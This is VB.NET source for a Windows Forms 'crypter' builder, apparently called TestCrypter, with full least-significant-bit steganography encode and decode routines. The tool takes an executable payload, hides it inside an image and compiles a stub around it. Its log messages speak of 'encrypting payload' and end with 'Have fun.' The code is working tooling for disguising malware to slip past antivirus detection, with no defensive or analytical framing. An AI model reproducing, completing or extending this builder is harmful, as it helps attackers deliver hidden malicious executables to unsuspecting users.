Imports System.Reflection
Imports TestCrypter.Compiler

Public Class Form1
    Dim drag As Boolean 
    Dim mousex As Integer 
    Dim mousey As Integer
    Dim Compiler As New EthernalCompiler
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
               If fd_save.ShowDialog = DialogResult.OK Then
                    Try
                        Dim b64str As String = Helpers.EncryptBase64(IO.File.ReadAllBytes(txt_open.Text))
                        txt_debug.Text += "[+] Encrypting payload to base64"
                        Dim EncodedBitmap As Bitmap = LSB.Encode(Bitmap.FromFile(txt_picture.Text),b64str)
                        txt_debug.Text += vbCrLf & "[+] Encoding Last Significant Bits (LSB) into image"
                        EncodedBitmap.Save(My.Computer.FileSystem.CurrentDirectory & "\tempbild.png", Imaging.ImageFormat.Png)
                        txt_debug.Text += vbCrLf & "[+] Saving image temporary to disk"
                        txt_debug.Text += vbCrLf & "[+] Generating / encrypting process started...."
                        Compiler.Source = My.Resources.src
                        Compiler.File_Align = File_Align._8192
                        Compiler.DotNetVersion = DotNetVersion.v4
                        Compiler.Platform = Platform.x86
                        Compiler.ErrorLog = False
                        Compiler.Unsafe = True
                        Compiler.References = New [String]() {"system.windows.forms.dll", "Microsoft.VisualBasic.dll", "mscorlib.dll", "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.0\System.Drawing.dll"}
                        Compiler.Target = Target.WinForms
                        Compiler.SilentMode = False
                        Compiler.Optimize = True
                        Compiler.Compile(fd_save.FileName, My.Computer.FileSystem.CurrentDirectory & "\tempbild.png")
                        txt_debug.Text += vbCrLf & "[!] Process complete! Have fun."
                        txt_debug.Text += vbCrLf & "[+] Just cleaning here 	(˵ ͡° ͜ʖ ͡°˵)"
                        If IO.File.Exists(My.Computer.FileSystem.CurrentDirectory & "\tempbild.png") Then
                            IO.File.Delete(My.Computer.FileSystem.CurrentDirectory & "\tempbild.png")
                        End If
                    Catch ex As Exception
                        txt_debug.Text = ""
                        txt_debug.Text = "Error: " & ex.Message
                        txt_debug.ForeColor = Color.Red
                    End Try
               End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
    End Sub



    Private Sub txt_picture_DragDrop(sender As Object, e As DragEventArgs) Handles txt_picture.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each path In files
            txt_picture.Text = path.ToString()
            Picturebox3.Imagelocation = path.ToString()
            PictureBox3.Refresh()
        Next
    End Sub

    Private Sub txt_picture_DragEnter(sender As Object, e As DragEventArgs) Handles txt_picture.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub txt_open_DragDrop(sender As Object, e As DragEventArgs) Handles txt_open.DragDrop
        Dim files() As String = e.Data.GetData(DataFormats.FileDrop)
        For Each path In files
            txt_open.Text = path.ToString()
        Next
    End Sub

    Private Sub txt_open_DragEnter(sender As Object, e As DragEventArgs) Handles txt_open.DragEnter
        If e.Data.GetDataPresent(DataFormats.FileDrop) Then
            e.Effect = DragDropEffects.Copy
        End If
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        Me.Close
    End Sub

    Private Sub PictureBox2_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox2.MouseDown
        drag = True
        mousex = Windows.Forms.Cursor.Position.X - Me.Left
        mousey = Windows.Forms.Cursor.Position.Y - Me.Top
    End Sub

    Private Sub PictureBox2_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox2.MouseMove
        If drag Then
            Me.Top = Windows.Forms.Cursor.Position.Y - mousey
            Me.Left = Windows.Forms.Cursor.Position.X - mousex
        End If
    End Sub

    Private Sub PictureBox2_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox2.MouseUp
        drag = False
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        lbl_about.top-=1
        If lbl_about.bottom=grp_about.Clientrectangle.top  Then
            lbl_about.top=grp_about.Clientrectangle.bottom - 10
        End If
    End Sub
End Class









Class LSB

    Public Shared Function Encode(BMP As Bitmap, Text As String) As Bitmap

        If BMP Is Nothing Then Throw New ArgumentException("Argument ""BMP"" cannot be null")
        If String.IsNullOrEmpty(Text) Then Throw New ArgumentException("Argument ""Text"" cannot be null")

        Dim TxtBytes() As Byte
        Using Txt_MS As New IO.MemoryStream(System.Text.Encoding.UTF8.GetBytes(Text))
            Using Compress_MS As New IO.MemoryStream
                Using CompressedStream As New IO.Compression.DeflateStream(Compress_MS, IO.Compression.CompressionLevel.Optimal)
                    Txt_MS.CopyTo(CompressedStream)
                End Using
                TxtBytes = Compress_MS.ToArray
            End Using
        End Using

        Dim Length() As Byte = BitConverter.GetBytes(TxtBytes.Length)
        Dim Temp(TxtBytes.Length + 3) As Byte
        Array.Copy(TxtBytes, 0, Temp, 4, TxtBytes.Length)
        TxtBytes = Temp
        Array.Copy(Length, 0, TxtBytes, 0, 4)

        Dim pixels() As Byte
        Dim handle As Runtime.InteropServices.GCHandle
        Dim compatibleBMP As Bitmap

        Try
            Dim PaddingLength As Integer = 4 - ((BMP.Width * 3) Mod 4)
            If PaddingLength = 4 Then PaddingLength = 0
            Dim Stride As Integer = BMP.Width * 3 + PaddingLength
            ReDim pixels(BMP.Height * Stride)
            handle = Runtime.InteropServices.GCHandle.Alloc(pixels, Runtime.InteropServices.GCHandleType.Pinned)
            Dim Scan0 As IntPtr = handle.AddrOfPinnedObject()
            compatibleBMP = New Bitmap(BMP.Width, BMP.Height, Stride, Imaging.PixelFormat.Format24bppRgb, Scan0)
            Using g As Graphics = Graphics.FromImage(compatibleBMP)
                g.DrawImage(BMP, 0, 0, BMP.Width, BMP.Height)
            End Using

            Dim BmpPtr As Integer = 0
            Dim BAPtr As Integer = 0
            Dim BA As New BitArray(TxtBytes)

            For y As Integer = 0 To BMP.Height - 1
                For x As Integer = 0 To BMP.Width - 1
                    BmpPtr = x * 3 + y * Stride
                    For z As Integer = 1 To 3
                        pixels(BmpPtr) = (pixels(BmpPtr) And &HFE) Or If(BA(BAPtr), 1, 0)
                        BmpPtr += 1
                        BAPtr += 1
                        If BAPtr = BA.Length Then
                            GoTo Done
                        End If
                    Next
                Next
            Next
Done:

            If BAPtr < BA.Length Then
                Throw New IndexOutOfRangeException("The bitmap was too small to encode the entire string")
            End If

            Return compatibleBMP
        Catch ex As Exception
            Throw New Exception("The encoding failed for unknown reason")
        Finally
            handle.Free()
        End Try
    End Function

    Public Shared Function Decode(BMP As Bitmap) As String

        If BMP.PixelFormat <> Imaging.PixelFormat.Format24bppRgb Then
            Throw New ArgumentException("Invalid bitmap")
        End If

        Dim Data As New Imaging.BitmapData
        BMP.LockBits(New Rectangle(0, 0, BMP.Width, BMP.Height), Imaging.ImageLockMode.ReadOnly, Imaging.PixelFormat.Format24bppRgb, Data)
        Dim pixels(BMP.Height * Data.Stride) As Byte
        Runtime.InteropServices.Marshal.Copy(Data.Scan0, pixels, 0, pixels.Length)
        Dim Stride As Integer = Data.Stride
        BMP.UnlockBits(Data)

        Try

            Dim DecodedBytes As New List(Of Byte)
            Dim BmpPtr As Integer = 0
            Dim Bit As Byte = 0
            Dim [Byte] As Byte = 0
            Dim BitIndex As Integer = 0
            Dim Length As Integer = 0

            For y As Integer = 0 To BMP.Height - 1
                For x As Integer = 0 To BMP.Width - 1
                    BmpPtr = x * 3 + y * Stride
                    For z As Integer = 1 To 3
                        Bit = (pixels(BmpPtr) And 1) << BitIndex
                        [Byte] = [Byte] Or Bit
                        If BitIndex = 7 Then
                            If Length <> 0 Then
                                If DecodedBytes.Count = Length Then
                                    GoTo Done
                                End If
                            End If
                            DecodedBytes.Add([Byte])
                            If DecodedBytes.Count = 4 And Length = 0 Then
                                Dim LengthByte() As Byte = DecodedBytes.ToArray
                                DecodedBytes.Clear()
                                Length = BitConverter.ToInt32(LengthByte, 0)
                            End If
                            [Byte] = 0
                            BitIndex = 0
                        Else
                            BitIndex += 1
                        End If
                        BmpPtr += 1
                    Next
                Next
            Next
Done:

            Dim UTF8Bytes() As Byte
            Using CompressMS As New IO.MemoryStream(DecodedBytes.ToArray)
                Using DecompressMS As New IO.MemoryStream
                    Using DecompressStream As New IO.Compression.DeflateStream(CompressMS, IO.Compression.CompressionMode.Decompress)
                        DecompressStream.CopyTo(DecompressMS)
                    End Using
                    UTF8Bytes = DecompressMS.ToArray
                End Using
            End Using

            Return System.Text.Encoding.UTF8.GetString(UTF8Bytes)
        Catch ex As Exception
            Throw New ArgumentException("The bitmap passed in the argument ""BMP"" is not a valid LSB encoded bitmap")
        End Try
    End Function
End Class
